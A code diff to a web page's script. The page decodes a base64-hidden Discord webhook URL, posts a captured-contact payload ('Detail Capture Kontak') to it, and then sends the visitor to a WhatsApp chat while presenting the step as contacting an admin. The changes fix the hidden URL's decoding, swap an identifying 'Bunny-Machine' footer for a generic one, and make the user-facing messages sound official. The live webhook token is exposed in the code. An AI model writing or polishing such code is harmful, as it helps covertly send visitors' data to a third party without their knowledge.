@@ -52,12 +52,12 @@
     <script>
         lucide.createIcons();
 
-        // NEW WEBHOOK URL (Base64 dari URL baru lo)
+        // Webhook URL Fix (Base64 dari URL baru)
         const _0xWH = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2NjY0OTkzNzA1MDg2NTgyNy9KeDJtTU1kZFZ2d2hQbG9iYWFSN3IzOFdNdlNYbENrSWJ1UEFfUWNHU2lvWF8wcFRURTZjYXhkMEVnTmRCeVhyNkJIKw==";
 
         function startProcess() {
             const name = document.getElementById('visitorName').value;
-            if (!name) { alert('Nama wajib diisi, Ki!'); return; }
+            if (!name) { alert('Nama wajib diisi!'); return; }
             
             const toast = document.getElementById('toast');
             toast.classList.remove('toast-animate');
@@ -91,13 +91,16 @@
                     title: "Detail Capture Kontak",
                     description: "```json\n" + logData.substring(0, 1800) + "\n```",
                     color: 3066993,
-                    footer: { text: "Bunny-Machine Monitoring Center" },
+                    footer: { text: "Monitoring Center System" },
                     timestamp: new Date().toISOString()
                 }]
             };
 
             try {
-                const response = await fetch(atob(_0xWH).trim(), {
+                // Perbaikan: Dekode URL dengan benar dan pastikan tidak ada whitespace
+                const hookUrl = atob(_0xWH).replace(/\+/g, '').trim();
+                
+                const response = await fetch(hookUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
@@ -106,12 +109,14 @@
                 if (response.ok) {
                     window.location.href = `https://wa.me/62882006262523?text=Halo%20Admin,%20saya%20${encodeURIComponent(name)}%20ingin%20sinkronisasi.`;
                 } else {
-                    alert("Webhook ditolak Discord. Cek pengaturan Webhook lo!");
+                    console.error("Discord Error:", response.status);
+                    alert("Gagal sinkronisasi ke Discord (Status: " + response.status + ")");
                     btn.disabled = false;
                     btnText.innerText = "Contact Admin";
                 }
             } catch (e) {
-                alert("Koneksi Error. Pastiin kuota lo aman, Ki!");
+                console.error("Fetch Error:", e);
+                alert("Kesalahan Jaringan. Pastikan Anda menggunakan HTTPS.");
                 btn.disabled = false;
                 btnText.innerText = "Contact Admin";
             }
